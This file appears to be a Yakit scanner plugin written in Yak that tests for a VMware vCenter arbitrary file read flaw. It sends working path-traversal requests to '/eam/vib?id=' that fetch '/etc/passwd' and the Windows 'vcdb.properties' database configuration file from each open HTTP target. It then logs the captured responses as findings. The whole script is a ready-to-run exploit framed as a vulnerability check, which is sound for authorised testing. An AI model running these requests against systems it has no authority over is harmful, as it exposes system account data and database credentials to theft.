yakit.AutoInitYakit()

handleCheck = func(target,port){
    var url
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)
    level=["","low","middle","high","critical"]
    if isTls {
        url="https://"+addr
    }else{
        url="http://"+addr
    }
    vulnable=false

    reference="vmware vcenter arbitrary file read 漏洞"
    severity="未填写"
    type="漏洞"

    poc_url_linux0= url + `/eam/vib?id=/etc/passwd`
    req_linux0, _ := http.NewRequest("GET",poc_url_linux0,http.noredirect(),
    http.header("Content-Type", `application/x-www-form-urlencoded`),)
    breq,_=http.dump(req_linux0)
    resp_linux0, err := http.Do(req_linux0)
    die(err)
    bresp,_=http.dump(resp_linux0)
    header, body = poc.Split(bresp)
    linux0_flag = false
    if resp_linux0.StatusCode == 200 && re.Match(`root:[x*]:0:0:`,string(body)){
        linux0_flag = true
    }

    poc_url_win0= url + `/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties`
    req_win0, _ := http.NewRequest("GET",poc_url_win0,http.noredirect(),
    http.header("Content-Type", `application/x-www-form-urlencoded`),)
    breq,_=http.dump(req_win0)
    resp_win0, err := http.Do(req_win0)
    die(err)
    bresp,_=http.dump(resp_win0)
    header, body = poc.Split(bresp)
    win0_flag = false
    if resp_win0.StatusCode == 200 && str.Contains(string(body),"org.postgresql.Driver"){
        win0_flag = true
    }

    poc_url=poc_url_win0
    if win0_flag || linux0_flag{
        vulnable = true
    }
    if vulnable {
            yakit.Info("FOUND INFO for %v %v",reference,type)
            risk.NewRisk(
                url, risk.severity(severity), 
                risk.title(sprintf("FOUND %v %v",reference,type)),
                risk.titleVerbose(sprintf("%v %v",reference,type)),
                risk.type(type), risk.typeVerbose(type),
                risk.details({
                    "request": breq,
                    "response": bresp,
                    "url": poc_url,
                }),
            )
        }
    return
}
handle = func(result) {
    if !result.IsOpen(){
        return
    }
    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
}
